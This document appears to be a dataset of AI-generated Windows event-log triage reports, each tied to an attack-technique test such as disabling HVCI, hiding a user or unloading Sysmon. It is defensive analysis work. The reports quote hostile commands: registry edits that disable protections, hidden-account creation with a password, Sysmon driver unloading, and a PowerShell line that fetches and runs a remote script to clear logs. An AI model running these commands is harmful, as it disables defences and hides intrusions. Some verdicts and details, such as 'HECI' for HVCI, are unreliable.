  - Both `hostname.exe` and `whoami.exe` are legitimate Windows utilities used for querying system and user information. The context in which they were executed is not inherently suspicious, but consistent with a user profiling an environment.

#### Interpretation:
- **Registry Modification is a Point of Concern:**
  - Modifying RDP security settings to lower the security layer is indicative of potentially malicious intent to compromise or weaken remote access configurations.

- **Wevtutil and Conhost Execution:**
  - While execution of event utilities is not inherently malicious, their frequent and rapid invocation along with the aforementioned registry changes requires further scrutiny, especially under the same user ID's context.

#### Assessment:
The observed registry edit actions, particularly the operation involved in changing RDP settings using `cmd.exe` and `reg.exe`, along with the user context and accompanying utilities usage, suggest that these activities deviate from normal administrative tasks. This could suggest attempts to configure the server in a way that may reduce its security posture.

### Resolution: SUSPICIOUS

#### Guidance on How to Proceed:
1. **Further Investigation:**
   - Verify the legitimacy of the user `SERVER002\admin_test` and confirm whether these registry changes were authorized administrative actions.
   - Review additional context around the sysmon logs, e.g., correlate these events with login events and potential alerts on unauthorized access or changes in privileges.
  
2. **Audit RDP Configuration:**
   - Check the RDP configuration to ensure it reflects compliant security settings.
   - Revert any unauthorized changes and ensure encryption is enforced.
  
3. **Monitor User Activities:**
   - Continue monitoring the logs for further suspicious activity from the said user and related processes.
   - Implement alerting for any further registry modifications or changes to critical services.
  
4. **Initiate Incident Response:**
   - If further investigations reveal unauthorized or hostile intent, trigger appropriate incident response mechanisms to contain and remediate the threat."
Create Windows System File with Attrib,"After reviewing the provided Windows event logs, I will conduct an analysis based on potential indicators of malicious activity, patterns, and any anomalous behavior.

### Security Event Logs Analysis

1. **EventID 4616**: These logs indicate a change in system time. This could be normal behavior, but it can also be an indicator of tampering if the time changes are unauthorized. In these logs, the changes are of very minimal time discrepancies, and no authorization concerns are evident from the logs.

### Application Log Analysis

2. **EdgeUpdate Service**: Repeated services stopped logs could indicate typical service behavior for automatic updates or a potential issue with the service itself. EdgeUpdate logs show continuous updates, which is commonly legitimate.

### Sysmon Log Analysis

3. **Cmd.exe Execution**: Multiple instances of `cmd.exe` execution logs with specific command-line arguments. This includes checks and manipulations of a file `data.001.txt` in the temp directory. These entries merit closer inspection:
   - **Command Execution Patterns**: The use of conditional checks and file attribute manipulations (`attrib.exe +s`) might suggest a script running for specific tasks. While normal in some contexts, if unexpected, this can indicate unauthorized system changes or persistence mechanisms by malicious scripts.
   - **Parent Process**: These cmd.exe executions originate from `wsmprovhost.exe`, which is a legitimate Windows process often used for executing PowerShell scripts in the context of Windows Remote Management. It isn't inherently suspicious but correlates with the usage context.

4. **Whoami, Hostname, wevtutil executions**: These are normally used to gather information about the system and user environment or to manage Windows events, which can be a part of administration tasks or reconnaissance from an attacker.

5. **Multiple EdgeUpdate Executions**: Regular updates by Microsoft Edge are usually benign. They show interaction with updates and installations which appear consistent with normal maintenance activities.

### Assessment
While most of the activities logged appear routine or suggest system maintenance and automatic updates:
- **Cmd.exe and related activities** are somewhat out of place if the admin (`admin_test`) did not intend them. The sequence showing file attribute changes (like setting system attribute) in the temporary directory might indicate unauthorized scripts or scheduled tasks attempting to evade detection or prepare files for a later stage attack. 

### Conclusion and Recommendation
Based on the analysis:
- **Resolution**: **SUSPICIOUS**
- Further Investigation Needed:
  - Verify with the system owner or admin_user if the `cmd.exe` executions and file operations involving `data.001.txt` are part of any scheduled or maintenance task.
  - Look for additional correlations such as network connections or file system changes not captured in provided logs.
  - Perform a security scan on the relevant directory and check for any scripts scheduled or unauthorized processes/services.
  
It seems these logs do not confirm a malicious activity but suggest that something unusual is happening. Therefore, further corroboration is needed to ascertain its legitimacy or to prevent a potential threat."
Invoke CHM with InfoTech Storage Protocol Handler,"Upon examination of the provided Windows event logs, the following observations and analysis can be made:

### Observations:
1. **PowerShell Activity**:
   - The PowerShell logs indicate the execution of a script: `powershell.exe & {Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`. This script-like command involves PowerShell executing a potentially suspicious function `Invoke-ATHCompiledHelp`.

2. **Sysmon Activity**:
   - Multiple processes were observed including `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`, all executed by the user `SERVER002\\admin_test` with high integrity level.
   - `wevtutil.exe` appears multiple times, possibly indicating interaction with Windows Event Logs, which can be a part of administrative tasks or potentially malicious activities aiming to cover tracks.

3. **Security Logs**:
   - A logon event (Event ID 4624) indicates logon with `SYSTEM` privileges. Event ID 4672 indicates assignment of a large number of privileges including `SeDebugPrivilege` which is often targeted during privilege escalation attempts.
   
4. **System Logs**:
   - Several `Microsoft-Windows-WindowsUpdateClient` events reflecting updates being processed/deployed. They seem routine and consistent with expected system administrative tasks.

### Analysis:
- The PowerShell command `Invoke-ATHCompiledHelp` is not a standard PowerShell command or a widely recognized script/function, which makes it suspicious. This could indicate custom scripting, possibly obfuscated to hide malicious purposes.
- The repeated use of `wevtutil.exe` by `admin_test` could signal potentially malicious intent such as clearing logs or querying sensitive logs, but lacks definitive contextual indicators.
- The use of SYSTEM-level privileges and security logs describing privilege assignment could be part of standard operations in some environments or may suggest privilege escalation or malicious use of elevated privileges.

### Conclusion:
Given the suspicious use of PowerShell with a non-standard command (`Invoke-ATHCompiledHelp`) combined with the frequent use of `wevtutil.exe` by a user account that also holds SYSTEM-level privileges, these events potentially point towards anomalous or suspicious activities rather than confirmed benign operations. However, there isn't irrefutable evidence from these logs alone that indicates 100% malicious intent.

### Resolution:
- **SUSPICIOUS**: The activities observed in the logs are deemed suspicious due to the use of potentially malicious PowerShell commands and the leveraging of `wevtutil.exe` in potentially covert operations. Further investigation is required to understand the script's origin and intent, correlation with other logs, and validation of expected behavior for the identified user and host. It's recommended to inspect associated network traffic, perform a more detailed forensic analysis of the involved systems, and verify with current threat intelligence feeds for any known indicators related to these commands or patterns."
office-365-Disable-AntiPhishRule,"Upon analyzing the provided logs, a few entries stand out as potentially suspicious or indicative of malicious activity:

1. **PowerShell Command Execution**: The Windows PowerShell logs indicate the execution of PowerShell commands to connect to Exchange Online and disable Anti-Phishing rules. The command includes:
   - Converting an empty string to a secure string and creating PSCredential objects, which is unusual as it lacks legitimate credentials.
   - Fetching and disabling Anti-Phishing rules without confirmation.
   
   This behavior is concerning as it suggests an attempt to weaken security defenses, which is a common action in the initial stages of attack activities.

2. **System and PowerShell Context**:
   - Commands are executed under the `admin_test` user, which could imply either misuse of an admin account or lateral movement using compromised credentials.
   - The execution is from `powershell.exe` with elevated permissions, and the absence of meaningful credential management poses a risk.

3. **Sysmon Process Creation Events**: The Sysmon logs show the frequent creation of PowerShell processes and associated actions under the `admin_test` user and `NT AUTHORITY\SYSTEM`, which might indicate suspicious automated tasks or scripts being executed:
   - The processes launch with sophisticated command-line sequences, often associated with scripts that could attempt privilege escalation or perform reconnaissance.
   - Notable processes like `SecureBootEncodeUEFI.exe` and pattern-matching on .inf files could be indicative of tampering attempts.

4. **Anomalous Application and System Events**: Although minus direct exploitation context, they could correlate with usual activities accompanying malicious PowerShell commands like system updates or artifacts of past exploitation attempts.

### Assessment and Resolution
Based on the analysis of the log activities and the potential risk they pose — especially concerning the disabling of Anti-Phishing rules and unauthorized PowerShell executions, along with the involvement of potentially sensitive command usage — the observed behavior should be classified as **MALICIOUS**.

### Guidance on How to Proceed
1. **Immediate Containment**:
   - Isolate the affected host (Server002) from the network to prevent further suspicious activities.
   - Review and potentially revoke any credentials related to the `admin_test` account, as this seems to be actively used for the activities.

2. **Detailed Forensics**:
   - Gather and analyze more comprehensive logs around the time of these PowerShell executions.
   - Check for any signs of data exfiltration or additional privilege escalation attempts on other endpoints.

3. **Mitigation and Recovery**:
   - Re-enable and review the Anti-Phishing rules on the Exchange Online.
   - Perform a security audit and patch any vulnerabilities in the PowerShell environment.

4. **Communication**:
   - Inform internal cybersecurity and IT teams of the detected threat.
   - Evaluate the broader impact and address any similar suspicious activities across other systems in the network. 

5. **Enhance Monitoring**:
   - Implement tighter monitoring on PowerShell executions with enhanced logging and the introduction of security alerts for sensitive script activity."
Disable Hypervisor-Enforced Code Integrity (HVCI),"**Analysis of Windows Event Logs:**

Upon reviewing the provided event logs, the analysis identifies a pattern of interest centering around activities involving Windows registry queries and modifications using `reg.exe` facilitated by `cmd.exe` and `PowerShell`. Below are the key observations:

1. **Registry Queries and Modifications:**
   - Several entries indicate a systematic querying of the registry by processes `cmd.exe` and `reg.exe`, specifically targeting security-related settings under `HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`.
   - The command line and parent command lines suggest the use of `PowerShell` to execute these queries and checks. These actions are likely part of a script or automated task evaluating security settings.
   - The pivotal observation arises from the PowerShell command found in the event logs: `{""CommandLine"":""\""powershell.exe\"" & {reg add \\\""\""HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\\\""\"" /v \\\""\""Enabled\\\""\"" /t REG_DWORD /d 0 /f}""`. This command entails modifying the registry to disable Hypervisor Enforced Code Integrity (`HECI`), a security feature.
   - The use of administrative privileges (`IntegrityLevel"":""High""`) combined with registry modifications raises substantial suspicion as such actions can mitigate protective features and potentially weaken system security.

2. **Execution Environment:**
   - All suspicious activities are executed under the context of the user `SERVER002\admin_test`, leveraging high-integrity tokens, indicative of administrative execution.
   - The persistent and repetitive nature of command executions such as querying and altering registry settings suggest automated or scripted deployment rather than interactive user actions.

3. **Associated Processes:**
   - The establishment of console hosts and usage of `conhost.exe` following these registry manipulations is typical but concatenates a string of process executions hinting at scripted or planned task sequences.
   - The PowerShell log entries confirm the triggering of these registry changes and capture their environment context.

**Assessment:**
Considering the notable alteration of critical security registry settings, particularly the disabling of a security feature without clear rationale, this activity appears intrusive and contrived to manipulate system defenses. This pattern is a prevalent technique used by malicious entities to gain persistence, evade defensive mechanisms, or prepare a system for further exploitation.

**Resolution: MALICIOUS**

**Guidance to Proceed:**
- **Immediate System Audit**: Urgently verify the current security configurations pertaining to Device Guard and Hypervisor Integrity. Revert any unauthorized modifications.
- **User Verification**: Authenticate the legitimacy and intention of the user `admin_test`. If compromised, launch an immediate investigation to ascertain the breach's context.
- **Script and Task Analysis**: Investigate for any scheduled tasks or scripts set to execute similar suspicious commands.
- **Network Monitoring**: Intensify network monitoring for unusual outbound connections originating from `Server002`.
- **Incident Response**: Initiate a formal incident response process, including isolating affected hosts, gathering further evidence, and determining the potential breach's extent and impact on third-party systems.

Following these procedures will be essential to secure the environment while further forensic analysis is conducted to determine the full scope of the compromise."
Create Hidden User in Registry,"Upon analyzing the provided event logs for Server002, the following findings and assessments have been made:

### Suspicious or Anomalous Behavior
1. **Unusual Account Activity:**
   - A new user account `fileOperator$` was created with the password `At0micRedTeam!` on `2024-10-28 13:28:46` as indicated by several security log events (IDs: 4720, 4728, 4722, 4738). The process responsible for this was `cmd.exe` executing the command: `NET USER fileOperator$ At0micRedTeam! /ADD /expires:never`.
   - The account was added to the ""Users"" group (Event ID: 4732), which is typical for newly created local user accounts, but the use of an account with a `$` suffix (commonly used for service accounts) is unusual for a regular user and may indicate an attempt to mask its presence.

2. **Registry Modification:**
   - A registry modification attempt was detected to hide this user from the Windows login screen (Event ID: 17984). This is done by modifying `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist` to add `fileOperator$`.

3. **High Integrity Level Commands:**
   - Commands executed at a high integrity level suggest elevated privileges. This level of access was used to create the user and modify registry entries.

4. **Execution of System Internal Utilities:**
   - Utilities such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe` were executed multiple times, which while generally benign, in this context could help obfuscate activities or contextually relate to unwanted or malicious scripts execution.

5. **Command Line Present:**
   - The invocation of `cmd.exe` without a rule or monitoring tool's explicit trigger (`RuleName` being ""-"") implies manual or script-based execution rather than a normal operating procedure.

### Malicious Activity Indicators
Based on the logs:
- The creation of a user with an odd naming convention and the modification of the registry to hide this user suggests malicious activity.
- The use of tools combined with elevated privileges to execute and obfuscate such commands aligns with typical post-exploitation activities.

### Assessment
The behavior seen in the logs is indicative of a potentially malicious actor attempting to establish persistent access or escalation within the system by creating a hidden system user account and ensuring it does not appear on typical user interfaces. The specific naming of the account (`fileOperator$`) could be an attempt to blend in as a service account, and the use of high-integrity context ensures that these actions are carried out without hindrance from typical security measures.

### Resolution
The resolution of these findings is classified as:
- **MALICIOUS** 

### Recommendations
- **Immediate Actions:**
  - Disable or remove the `fileOperator$` account and audit any other user accounts created by the user `admin_test`.
  - Review and restore relevant registry keys to their secure state to prevent these users from being hidden.

- **Further Investigation:**
  - Conduct a forensic review of user activity, specifically `admin_test` around the timestamp to identify abnormal access patterns or lateral movement attempts.
  - Analyze all related processes and scheduled tasks to determine if there are other embedded scripts or executables aimed at persistence.
  
- **Preventive Measures:**
  - Implement stricter monitoring and detection rules for high-integrity level process executions and registry modifications.
  - Enhance user education and enforce security protocols to handle these security breaches proactively.

By addressing these points, the organization can mitigate this unauthorized access and secure its systems against future attacks of a similar nature."
Disable Windows Registry Tool,"### Detailed Analysis of Logs:

1. **Security Logs:**
   - The security logs show EventID 4616 which corresponds to a system time change. The logs indicate repeated time steps, but they appear to vary only slightly and could be due to legitimate time synchronization activities. These activities are executed by `svchost.exe` under the context of the `LOCAL SERVICE` account, which is normal for Windows time service activities.
   - Conclusion: No suspicious activities noted under the security log entries provided.

2. **Application Logs:**
   - The application log entry indicates the stopping of the `edgeupdate` service. Service updates are a common and expected activity, particularly for services related to browser updates.
   - Conclusion: Stopping of the `edgeupdate` service seems benign and typical of a legitimate software update process.

3. **System Logs:**
   - These largely include time synchronization events which align with the security logs, indicating that `svchost.exe` actions were related to system time adjustments.
   - EventID 35 from Windows Time-Service indicates successful time source synchronization with the server `time.windows.com`.
   - Conclusion: No abnormal activities detected; logs suggest normal time synchronization operations.

4. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe` are found. The series of commands executed by `cmd.exe`, especially adding a registry key to disable registry tools, is suspicious. 
     - `cmd.exe` executed with the following command: 
       ```""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f```
     - This command effectively disables registry access, which is often used by malicious actors to prevent detection or modification of settings.
   - The execution of standard utilities such as `whoami.exe` and `hostname.exe` could be benign, yet when coupled with registry modifications, they may indicate reconnaissance and policy manipulation.
   - The logs reveal these operations are conducted by a user account `SERVER002\admin_test`. The integrity level is high, suggesting administrative level permissions.
   - Conclusion: The command-line activity involving registry modification and use of event utilities (`wevtutil.exe`) for exporting logs could be indicative of attempts to cover tracks or disable system monitoring, commonly associated with malicious activities.

### Assessment:

- **Security Threats/ Risks Identified:**
  - There is a significant threat from the suspicious use of the command-line to alter registry settings that disable access to registry tools. This action is a strong indicator of malicious intent.
  - The repeated use of `wevtutil.exe` could indicate attempts to export or clear event logs to hide malicious traces.

### Guidance:

1. **Resolution**: **MALICIOUS**

2. **Recommended Actions:**
   - **Immediate Containment**: Isolate the host `Server002` from the network to prevent potential lateral movement.
   - **Detailed Investigation**: Conduct a deeper forensic analysis on `Server002` focusing on the timeline of events and any recent changes in system or network behavior.
   - **User Account Review**: Investigate the activities of the `admin_test` account for any unauthorized logins or activities.
   - **Registry Recovery**: Attempt to restore the registry settings and ensure that no critical tools have been disabled.
   - **Log Review**: Check for tampered or missing logs consistent with the timeline of suspicious activity.
   - **Review and Hardening**: Implement stricter access controls and monitoring for registry-related changes and command-line executions on sensitive hosts.

These steps are critical to understanding the full scope of the compromise and ensuring further security hardening against such unauthorized changes in the future."
System File Copied to Unusual Location,"### Detailed Analysis of the Logs

#### Suspicious and Anomalous Behavior
1. **Repeated Credential Reading Failures**: A series of events with EventID 5379 in the Security log shows multiple credential reading attempts that failed with a return code of 3221226021. The process creation time is consistent across all these events which might suggest an automated process or script attempting to access sensitive data (e.g., password hashes or tokens). However, this specific return code indicates a STATUS_NO_SUCH_LOGON_SESSION error, which is not inherently malicious but could suggest misconfiguration or failed attempts to access credential material possibly by a misconfigured or an unintended script/service.

2. **PowerShell Commands**: The execution of a suspicious PowerShell script is visible in both the Sysmon and Windows PowerShell logs. This command copies the cmd.exe from the system directory to another location and then attempts to start and stop the process with a 5-second sleep in between. This behavior is suspicious as it is a common tactic used for evasion or persistence by malware.

3. **Process Creation with Elevated Integrity**: The execution of PowerShell and subsequent creation of cmd.exe with high integrity suggests attempts to execute commands with elevated privileges, which is typically associated with privilege escalation techniques.

4. **Unauthorized Process Activity**: The execution of `wevtutil.exe` is seen, a tool that can be used to clear event logs and obscure malicious activities from detection. This could be an indicator of attempts to cover tracks after unauthorized activity.

5. **Other Process Execution**: Many process executions like `whoami.exe`, `hostname.exe`, and `conhost.exe` are observed. While these are standard system processes, the context in which they were used—especially the `whoami.exe` and `hostname.exe` used in a sequence—might be reconnaissance commands to gather system information.

#### Malicious Activity Indicators
- The PowerShell command executed suggests a potentially malicious activity often seen in attempts to create persistence or execute unauthorized commands subtly.
- The combination of system tool usage like `wevtutil.exe`, `cmd.exe` creation in unauthorized directories, and the PowerShell activities align with tactics used in compromise incidents.

### Assessment
Based on the logs' analysis, there's strong evidence pointing towards suspicious behavior, especially considering typical tactics employed by malicious actors involving PowerShell, credential access attempts, and possible log manipulation attempts using `wevtutil`.

### Resolution: **SUSPICIOUS**

While there are signs that could very well indicate malicious intent, specifically the activities surrounding PowerShell usage and system tool execution, there is a lack of a direct indication of a successful compromise or execution of malicious payloads. Therefore, further investigation is recommended to confirm whether this behavior is harmless or if it is part of an ongoing or past intrusion attempt.

### Guidance on How to Proceed
1. **Monitor and Capture**: Begin continuous monitoring of the host for similar command-line usage and execute process creation logs to ascertain if unauthorized escalation is attempted again.
2. **User Behavior Analysis**: Check if there are any legitimate reasons for the scripts or processes launched by admin_test. Verify this user's usual activities to establish a baseline.
3. **Isolate and Secure**: If possible, isolate the host for further inspection to prevent potential lateral movement across the network.
4. **Investigate Failed Credential Access**: Review configurations or scripts that could have resulted in these failures to access credentials.
5. **Examine Relevant Scripts/Applications**: Look for misconfigured applications or unauthorized scripts residing on the server.
6. **Update and Patch**: Ensure all systems and software on the host are updated to protect against any vulnerabilities that could be exploited."
attrib - hide file,"### Detailed Analysis of Windows Event Logs

**Suspicious or Anomalous Behavior:**

1. **Unusual Process Execution and Command-Line Usage:**
   - **Sysmon Event ID 1** (Process Creation) for `cmd.exe`:
     - The command-line specified in one of the Sysmon logs shows a usage of `cmd.exe` with a command chain that creates directories and hides files using `attrib +h`. Particularly the part `""cmd.exe"" /c mkdir %%temp%%\\data.001_attrib_2 &gt;nul 2&gt;&amp;1 &amp; echo data... &amp; attrib.exe +h ...`, which seems to be doing unnecessary obfuscation.
     - Usually, this type of command-line activity involving file and directory manipulation and changing file attributes to hidden can be indicative of a script or process attempting to hide its tracks—in a typical user environment, this isn't standard behavior.

2. **Process Execution of System Utilities:**
   - Multiple executions of system utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and `conhost.exe` by the same user (`SERVER002\\admin_test`) in a short span might suggest an active investigation or enumeration being conducted by a user, or worse, the scripts/tools could be used as part of a reconnaissance or evasion technique within the system.

3. **Execution of Microsoft Edge Updater from Temp Location:**
   - The execution of an instance of `MicrosoftEdgeUpdate.exe` from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU458B.tmp\\MicrosoftEdgeUpdate.exe`) deviates from its normal installation path. This doesn't seem intentional for normal operations and could be a red flag for possible masquerading of legitimate updater tools to run malware.

4. **Excessive Instantiation of `conhost.exe`:**
   - Though `conhost.exe` is a legitimate Windows process, the number of its instances within an extremely short period raises suspicion about script automation used either for valid administrative tasks or potentially malicious activities.

5. **Activities with High Integrity Level:**
   - Several of the aforementioned processes run with high integrity levels, which denotes privileges are elevated, potentially expanding the risk profile in the event of compromise.

**Security and System Events:**
- Security audit (`EventID 4616`) related to a time change indicates synchronization activities but arises no direct threat.
- `Kernel-General` logs depict system time adjustments aligning with standard NTP synchronization mentioning `time.windows.com`, which is expected behavior.

**Assessment and Resolution:**

Based upon mentioned observations, the activity recorded within the event logs appears to exhibit characteristics of potential automation or scripting that isn't typical for routine operations. The anomalous use of utilities such as cmd.exe and whoami, along with file attribute changes, albeit inconclusive on their own, align with common tactics involved in suspicious activity scenarios like enumeration and potential preparation for further actions (e.g., lateral movement).

**Resolution:** **SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Further Investigation:**
   - Correlate these events with any scheduled tasks, scripts, or batch executions that might explain them.
   - Evaluate usage of cmd.exe and similar events to determine if they originate from authorized scripts/applications.

2. **Review User Account Activity:**
   - Scrutinize the activities associated with the `admin_test` account, augmenting account monitoring for any further anomalies.

3. **Conduct Endpoint Security Scans:**
   - Deploy enhanced malware scanning and integrity checks specifically focused on identifying hidden or obfuscated scripts.

4. **Monitor Network Traffic:**
   - Identify any outbound anomalies indicative of data exfiltration or unauthorized access stemming from these activities.

5. **Increase Monitoring and Logging:**
   - Adjust logging and alerting settings in your SIEM to capture similar future occurrences rapidly.

By proceeding with the above steps, detailed scrutiny will further ascertain the likelihood of potential compromise or verify benign usage under known processes."
Store file in Alternate Data Stream (ADS),"Upon analyzing the provided Windows event logs across various channels (Sysmon, System, Security, Application, and Windows PowerShell), several points can be considered:

1. **Sysmon Logs:**
   - The usage of `wevtutil.exe` and `conhost.exe` being executed by ""SERVER002\\admin_test"" at the same timestamps (e.g., Event IDs 17950-17951) suggests a benign administrative activity involving event log management using standard system utilities.
   - A consistent pattern is observed with legitimate executable paths and standard Windows processes that indicate normal usage. These do not exhibit suspicious characteristics such as abnormal file paths or hashes not matching known-good files.
   - Powershell activities linked to ""SERVER002\\admin_test"" involve creating directories and redirecting outputs to alternate data streams (e.g., `C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:desktop.ini`). While this script uses Powershell legitimately, the use of alternate data streams could require further scrutiny.

2. **System and Security Logs:**
   - Time change events in the system logs (Event IDs: 3570, 3573, 30349, 30350) represent a legitimate Windows adjustment related to time synchronization. This is a standard operation and usually does not signal malicious behavior unless occurring unexpectedly.

3. **Application Logs:**
   - EdgeUpdate-related events indicate updates and registration activity for Microsoft Edge applications. These are common maintenance tasks associated with updating and managing software components.

4. **Windows PowerShell Logs:**
   - Events involve a PowerShell script executed by ""SERVER002\\admin_test"" which creates folders and moves data to alternate data streams. Though possibly benign, such activities can be associated with file obfuscation tactics used in malware, necessitating further inspection.

### **Assessment:**

After a comprehensive review of the event logs, the overall activity appears mostly benign with expected system maintenance and update processes. However, certain elements, like the redirection to alternate data streams, justify a **SUSPICIOUS** resolution. While typical in some system administration scripts, if such usage was not expected, it may warrant confirmation that these tasks were authorized and necessary. Hence, with additional verification of these activities' legitimacy and authorization, the suspicions might either be mitigated or prompt a deeper investigation into related users and activities.

### **Guidance:**

- **Verify** with responsible parties if the Tasks and scripts executed using PowerShell, particularly with alternate data stream operations, are authorized.
- **Review** system policies on automatic updates and the execution of system-level processes like `wevtutil.exe` to ensure compliance with security standards.
- If the alternate data stream usage is unauthorized, conduct a more thorough forensic investigation of the involved user accounts and network activity, as this tactic can be used to conceal data. 

Ensure these actions are compliant with both security protocols and privacy considerations."
Lolbin Gpscript logon option,"In analyzing the provided logs, several observations can be made regarding standard behavior and some areas that may warrant closer attention:

### Overview of Logs:
1. **Security Log:**
   - The security logs indicate multiple changes in the system time (`EventID 4616`). This action, often executed by the `svchost.exe` process under `LOCAL SERVICE`, does not inherently suggest malicious activity alone. However, these frequent changes can be anomalous if not aligned with routine maintenance or updates.

2. **Sysmon Log:**
   - Repeated executions of system and service management processes are present (`wevtutil.exe`, `conhost.exe`, `wsmprovhost.exe`, `cmd.exe`). These processes, generally legitimate, are running under the `SERVER002\admin_test` user and `NT AUTHORITY\SYSTEM`, which is typical in administrative contexts or automated system operations.
   - The presence of `cmd.exe` with the `/c Gpscript /logon` command suggests a group policy script executed at logon, which can be legitimate but warrants confirmation if not typical.
   - Several entries related to the `MicrosoftEdgeUpdate.exe` process are seen with various command-line arguments, including update checks (`/svc`, `/ping`, `/update`). These actions can be part of regular software updates for Microsoft Edge.

3. **System Log:**
   - Entries related to kernel and time adjustments are consistent with those in security logs. No additional anomalous system-level behavior is noted.

4. **Application Log:**
   - Routine entries related to Microsoft Edge updates and service stops. These correlate with the Sysmon logs and likely reflect typical software management activities.

### Assessment:
- **Time Change Events**: The frequent time changes are unusual and could potentially correlate with malicious activity if used to bypass time-based security controls. However, if linked to known maintenance or legitimate administrative operations, this could be dismissed.
- **Edge Update**: The `MicrosoftEdgeUpdate.exe` and associated processes demonstrate typical update behavior. No indications suggest these processes are being misused maliciously.
- **Command-line Executions**: While the `cmd.exe` entries might appear suspicious due to scripting logic, these reflect standard operations in a system managing group policies during user logon sessions.

### Final Resolution:
Given the analysis of the logs, there are no concrete indicators of malicious activity apparent. The actions seem to align with benign behavior typical in system and application maintenance contexts. However, the frequent system time modifications and script execution upon login could warrant verification of related administrative routines or scheduled tasks.

**Resolution: BENIGN** - Logs contain benign activity consistent with regular system operations and updates. However, it would be prudent to validate that these activities align with expected administrative actions or IT policies."
Unload Sysmon Filter Driver,"**Analysis of Logs:**

1. **Suspicious Command Execution:**
   - The Windows Sysmon logs indicate the execution of several command-line utilities like `fltMC.exe`, `findstr.exe`, `wevtutil.exe`, `whoami.exe`, and `cmd.exe`. While these utilities can be used for legitimate administrative purposes, their usage in a sequence, particularly involving `fltMC.exe` to unload filters, suggests an intention to disable the Sysmon driver (`SysmonDrv`). The specific command in the logs `""cmd.exe"" /c fltmc.exe unload SysmonDrv` is particularly troubling as it directly attempts to disable a security monitoring tool.

2. **Detection and Bypass Attempts:**
   - The presence of commands checking for active filters (`fltMC.exe filters | findstr SysmonDrv`) and then deciding on a course of action indicates an attempt to detect and possibly bypass security measures. This kind of behavior is often associated with adversaries who are attempting to disable or evade monitoring solutions.

3. **Attempts to Alter System State:**
   - The security and system logs show a series of events where the system time is altered, which could be an attempt to cover tracks or evade time-based security controls.

4. **Sysmon Error Event:**
   - There is an event with Sysmon indicating a failure to retrieve events with the description ""Failed to retrieve events - Last error: The I/O operation has been aborted because of either a thread exit or an application request."" This could be a result of the unloading of Sysmon driver.

5. **Potential Insider Threat or Misconfiguration:**
   - All suspicious activities are performed by the user `SERVER002\\admin_test`. This may indicate a potential insider threat or simply the use of a test administrative account to perform tasks without a clear record.

**Assessment:**
- **SUSPICIOUS** - The logs indicate a series of activities that are highly indicative of attempts to disable or evade security monitoring tools, potentially by a sophisticated threat actor or an insider with administrative access. This sequence of behavior is not typical for benign operations and warrants further investigation.

**Guidance:**
- Conduct a thorough investigation of the `SERVER002\\admin_test` account's activities to ascertain the user's intentions and assess if any other systems have been compromised.
- Check other security monitoring tools or logs to confirm any additional attempts to disable security measures, as this may indicate wider attack activity.
- Tighten access controls for administrative accounts and review audit logs to prevent unauthorized or excessive administrative activities.
- If the Sysmon driver was successfully unloaded, consider re-deploying Sysmon and ensuring proper configurations and protections to prevent future tampering.
- Engage in discussions on security policies to limit the usage of administrative privileges and implement monitoring for suspicious command executions involving administrative utilities."
Service Registry Permissions Weakness,"After conducting a detailed analysis of the provided Windows event logs, several key observations and findings have been identified. Here is a breakdown of the suspicious activities and the overall assessment:

### Suspicious or Anomalous Behavior:

1. **Unusual PowerShell Usage**:
   - The PowerShell event logs capture the execution of a command to get ACLs (access control lists) for registry keys under `HKLM\SYSTEM\CurrentControlSet\Services` and a specific key `\Services\weakservicename`. 
   - While querying registry ACLs can be part of legitimate administrative tasks, it could be exploited for reconnaissance in exploring services or for privilege escalation opportunities by identifying improperly secured services.

2. **Execution of Admin-Level Commands by a Non-Standard User**:
   - The sysmon logs show a user `SERVER002\admin_test` running multiple system utility programs like `whoami.exe`, `wevtutil.exe`, and PowerShell. This is potentially anomalous if `admin_test` is not typically a user account that should perform administrative tasks on the server.

3. **Edge Update Process**:
   - Multiple EdgeUpdate processes are logged, which could indicate an update or installation in progress. While widespread execution of an updater could be regular, it's worth verifying the digital signatures and the origin of these updates to rule out a supply chain attack scenario.

### Malicious Activity Indicators:
- There are no clear indicators within the logs that prove undeniably malicious activities such as the presence of malware signatures, confirmed exploitation, or backdoor implementations. However, the PowerShell activity merits a closer look due to its potential use in a reconnaissance phase by an attacker.

### Assessment, Threats, and Risks:

- **Threat**: The PowerShell execution may imply a threat if conducted without the knowledge of system administrators, as it suggests enumeration that could lead to privilege escalation or other malicious intentions.
- **Risk**: If the activity was not authorized, there's a risk of data or credential discovery, leading to an increased risk of further compromise.

### Guidance on How to Proceed:
- **Verify User Activity**: Check the context of operations performed by user `SERVER002\admin_test`. Confirm whether these actions are expected and comply with company policies.
- **PowerShell Logging**: Enhance PowerShell logging to capture command-line arguments and script blocks to provide more context for these events.
- **Service Audit**: Perform an audit on service account configurations and service-specific permissions to ensure there are no improperly configured access controls.
- **Edge Update Verification**: Validate the Edge Update’s file integrity and certificates to ensure the source is legitimate and secure.

### Resolution:
Given the findings and the analysis, the resolution is: 

**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation, particularly around the PowerShell commands and user behavior associated with `admin_test`. There are no direct confirmations of malicious activity, but the patterns warrant further scrutiny."
Clear Event Logs via VBA,"### Detailed Analysis:

Upon reviewing the provided event logs, several key observations are noted which suggest suspicious activity particularly involving PowerShell, privilege escalation, and user account enumeration:

1. **Suspicious PowerShell Activity:**
   - The Sysmon and Windows PowerShell logs indicate execution of PowerShell scripts directly from an external URL: `""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1""`. This command-line execution attempts to download and invoke a script from an online source, which is a typical behavior of malicious actors attempting to run unverified scripts.
   - The PowerShell command is used to download a script and invoke it with specific parameters that include clearing logs (`-sub ""ClearLogs""`), which can be an indicator of an attempt to cover tracks.

